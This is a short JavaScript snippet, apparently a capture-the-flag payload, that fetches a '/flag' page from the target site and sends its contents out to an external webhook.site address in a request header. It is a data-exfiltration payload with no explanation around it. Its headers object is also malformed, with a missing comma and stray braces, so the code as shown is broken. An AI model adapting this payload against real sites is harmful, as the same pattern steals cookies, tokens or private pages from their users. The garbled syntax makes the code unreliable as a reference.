async function fetchFlagAndSendToWebhook(webhookUrl) {
  try {
    const response = await fetch('/flag');
    const data = await response.text();
    console.log(data);

    const webhookResponse = await fetch(webhookUrl, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json'
        'data': JSON.stringify({ data })}
      }
      
    });
    console.log('Webhook response:', await webhookResponse.text());
  } catch (error) {
    console.error('Error:', error);
  }
}

fetchFlagAndSendToWebhook('https://webhook.site/804c6227-d9a7-4ae4-9a58-c94a51ae5912');
